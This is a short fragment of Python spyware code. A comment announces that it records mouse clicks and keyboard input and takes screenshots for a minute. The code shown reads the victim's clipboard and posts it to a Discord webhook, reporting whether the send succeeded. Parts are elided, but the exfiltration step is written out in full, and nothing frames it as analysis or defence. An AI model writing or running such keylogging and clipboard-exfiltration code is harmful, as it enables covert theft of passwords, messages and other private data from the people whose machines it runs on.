...
# Start recording mouse clicks, keyboard input, and taking screenshots for 1 minute...
...
if clipboard_content:
    clipboard_content_utf8 = clipboard_content.encode("utf-8")
    data = {
        "content": clipboard_content_utf8.decode("utf-8")
    }
    response = requests.post(discord_webhook, json=data, headers={'Content-Type': 'application/json'})
    if response.status_code == 200:
        print("Clipboard content successfully sent to Discord!")
    else:
        print(f"Error while sending clipboard content to Discord: {response.status_code}")
